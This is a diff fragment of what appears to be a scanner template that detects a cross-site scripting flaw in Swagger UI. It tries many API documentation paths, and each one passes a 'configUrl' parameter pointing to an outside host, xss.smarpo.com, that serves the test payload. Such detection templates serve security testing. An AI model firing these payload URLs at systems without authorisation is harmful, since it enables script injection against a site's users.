@@ -30,7 +30,7 @@ requests:
       - "{{BaseURL}}/api/swagger-ui/index.html?configUrl=https://xss.smarpo.com/test.json" 
       - "{{BaseURL}}/api/docs/index.html?configUrl=https://xss.smarpo.com/test.json" 
       - "{{BaseURL}}/api/doc/index.html?configUrl=https://xss.smarpo.com/test.json"       
-      - "{{BaseURL}}/api/?configUrl=https://xss.smarpo.com/test.json"      
+      - "{{BaseURL}}/api/index.html?configUrl=https://xss.smarpo.com/test.json"      
       - "{{BaseURL}}/api/v1/swagger/index.html?configUrl=https://xss.smarpo.com/test.json"
       - "{{BaseURL}}/api/v1/swagger-ui/index.html?configUrl=https://xss.smarpo.com/test.json" 
       - "{{BaseURL}}/api/v1/docs/index.html?configUrl=https://xss.smarpo.com/test.json"   
